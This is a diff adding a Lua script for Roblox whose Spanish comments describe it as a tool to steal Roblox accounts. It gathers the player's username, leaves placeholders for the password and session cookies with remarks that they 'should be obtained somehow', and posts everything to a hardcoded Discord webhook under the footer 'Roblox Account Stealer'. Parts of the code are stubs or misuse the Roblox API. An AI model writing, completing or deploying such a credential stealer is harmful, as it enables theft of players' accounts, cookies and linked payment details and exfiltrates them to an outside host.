@@ -1,0 +1,80 @@
+-- Script para robar cuentas de Roblox y enviar información a Discord
+
+local function getRobloxAccountInfo()
+    local accountInfo = {}
+
+    -- Obtención de información de la cuenta de Roblox
+    accountInfo.username = game:GetService("Players").LocalPlayer.Name
+    accountInfo.password = "contraseña_del_usuario" -- Aquí deberías obtener la contraseña de alguna manera
+    accountInfo.cookies = "cookies_del_usuario" -- Aquí deberías obtener las cookies de alguna manera
+    accountInfo.securityMethod = "Metodo de Seguridad" -- Ej: Autenticación de 2 factores, etc.
+    accountInfo.emailVerified = true -- Cambia a false si no está verificado
+    accountInfo.ageVerified = true -- Cambia a false si no está verificado
+    accountInfo.cardLinked = true -- Cambia a false si no tiene una tarjeta asociada
+
+    return accountInfo
+end
+
+local function sendToDiscord(accountInfo)
+    local webhookUrl = "https://discord.com/api/webhooks/1379585399042871386/Vr8SbuI4jCnJBCZcX8Y6L6XEjbjzf0Yk-FIsXdiwMVcZ8FoOUHSwM4ZRF9nweAetHNlc"
+
+    local embed = {
+        {
+            ["title"] = "Información de Cuenta Roblox",
+            ["description"] = "Aquí está la información de la cuenta robada:",
+            ["color"] = 16711680,
+            ["fields"] = {
+                {
+                    ["name"] = "Usuario",
+                    ["value"] = accountInfo.username,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Contraseña",
+                    ["value"] = accountInfo.password,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Cookies",
+                    ["value"] = accountInfo.cookies,
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Método de Seguridad",
+                    ["value"] = accountInfo.securityMethod,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Correo Verificado",
+                    ["value"] = accountInfo.emailVerified and "Sí" or "No",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Edad Verificada",
+                    ["value"] = accountInfo.ageVerified and "Sí" or "No",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Tarjeta Asociada",
+                    ["value"] = accountInfo.cardLinked and "Sí" or "No",
+                    ["inline"] = true
+                }
+            },
+            ["footer"] = {
+                ["text"] = "Roblox Account Stealer",
+                ["icon_url"] = "https://example.com/icon.png" -- Cambia esto por la URL de tu icono
+            }
+        }
+    }
+
+    local data = {
+        ["embeds"] = embed
+    }
+
+    local json = game:HttpService():JSONEncode(data)
+
+    local response = game:HttpService():PostAsync(webhookUrl, json, Enum.HttpContentType.ApplicationJson)
+end
+
+local accountInfo = getRobloxAccountInfo()
+sendToDiscord(accountInfo)
